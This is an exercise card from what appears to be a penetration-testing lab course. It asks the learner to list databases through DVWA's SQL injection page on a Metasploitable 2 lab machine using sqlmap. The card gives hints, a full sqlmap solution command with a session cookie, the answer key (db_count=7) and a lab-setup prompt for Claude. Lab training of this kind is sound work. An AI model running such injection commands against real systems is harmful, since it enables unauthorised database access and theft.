# Q068 — sqlmap List DBs

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` (Metasploitable 2) |
| **Domain** | 12 — Web Apps / 13 — SQLi |
| **Difficulty** | 🟡 Medium |
| **Tools** | `sqlmap` |
| **Time budget** | 15–25 min |

---

## 📝 Question

Use sqlmap to list **all databases** through DVWA SQLi. How many databases are returned?

---

## 🎯 Flag Format

```
db_count=<n>
```

Example: `db_count=7`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

`--dbs` flag.
</details>

<details>
<summary>Hint 2</summary>

MySQL info_schema, mysql, dvwa, owasp10, tikiwiki etc.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
sqlmap -u 'http://192.168.52.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='PHPSESSID=X; security=low' --dbs --batch
```

Typically 7 databases: information_schema, dvwa, metasploit, mysql, owasp10, tikiwiki, tikiwiki195.

**Answer:** `db_count=7`

📖 Ref: [playbooks/sqli-playbook.md](../../playbooks/sqli-playbook.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
Pre-requisites for Q068:
1. Same as Q067: DVWA up, security=low, PHPSESSID captured.
2. Verify sqlmap on Parrot: which sqlmap.

Report back: "Lab ready for Q068 — DVWA reachable, security=low, PHPSESSID available".
```
